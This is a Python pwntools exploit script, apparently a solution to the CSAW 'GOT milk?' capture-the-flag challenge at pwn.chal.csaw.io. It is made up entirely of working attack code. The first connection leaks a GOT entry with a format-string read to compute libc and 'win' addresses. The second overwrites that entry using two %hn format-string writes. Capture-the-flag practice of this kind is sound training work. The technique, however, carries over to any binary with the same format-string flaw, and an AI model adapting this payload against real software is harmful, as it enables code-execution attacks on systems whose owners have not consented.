from pwn import *
context.log_level = 'error'

def exploit():
    p = remote("pwn.chal.csaw.io", 8000)
    p.recvuntil(b"GOT milk? ")
    # Leak lose GOT entry
    p.sendline(p32(0x804a010) + b"%7$s")
    data = p.recvuntil(b"\n\nNo flag for you!\n")
    idx = data.index(b"\x10\xa0\x04\x08") + 4
    leak = u32(data[idx:idx+4])
    log.info("leaked lose = %#x" % leak)
    libc_base = leak - 0x11f8
    win = libc_base + 0x1189
    log.info("libc base = %#x, win = %#x" % (libc_base, win))
    p.close()
    return win

def pwn(win):
    p = remote("pwn.chal.csaw.io", 8000)
    p.recvuntil(b"GOT milk? ")
    low = win & 0xffff
    high = (win >> 16) & 0xffff
    log.info("low = %#x, high = %#x" % (low, high))
    # addresses at positions 7 and 8
    # write low to 0x804a010, high to 0x804a012
    # order: write smaller first
    if low < high:
        # write low first (to 0x804a010), then high (to 0x804a012)
        payload = p32(0x804a010) + p32(0x804a012)
        # current printed = 8
        payload += b"%" + str(low - 8).encode() + b"c%7$hn"
        payload += b"%" + str(high - low).encode() + b"c%8$hn"
    else:
        payload = p32(0x804a012) + p32(0x804a010)
        payload += b"%" + str(high - 8).encode() + b"c%7$hn"
        payload += b"%" + str(low - high).encode() + b"c%8$hn"
    p.sendline(payload)
    data = p.recvall(timeout=3)
    print(data.decode(errors='replace'))

win = exploit()
pwn(win)
